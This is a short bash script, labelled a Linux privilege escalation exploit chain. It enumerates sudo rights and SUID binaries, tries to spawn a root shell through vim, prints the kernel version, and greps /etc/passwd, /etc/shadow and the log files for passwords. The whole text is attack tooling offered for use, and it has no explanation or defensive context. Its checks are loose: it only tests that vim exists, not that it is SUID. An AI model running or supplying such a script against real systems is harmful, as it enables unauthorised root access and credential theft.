#!/bin/bash
# Linux Privilege Escalation Exploit Chain

echo "[*] Checking sudo privileges..."
sudo -l

echo "[*] Searching for SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | grep -E 'nmap|bash|perl|python|find|vim'

echo "[*] Attempting to exploit writable SUID binary with shell spawn..."
# Example: exploiting vim if it's SUID and writable (adjust as needed)
if [ -f /usr/bin/vim ]; then
  echo "[*] Spawning shell with vim..."
  /usr/bin/vim -c ':!/bin/sh'
fi

echo "[*] Enumerating kernel version..."
uname -a

echo "[*] Searching for credentials in memory and files..."
grep -i password /etc/passwd /etc/shadow /var/log/* 2>/dev/null

echo "[*] Done."
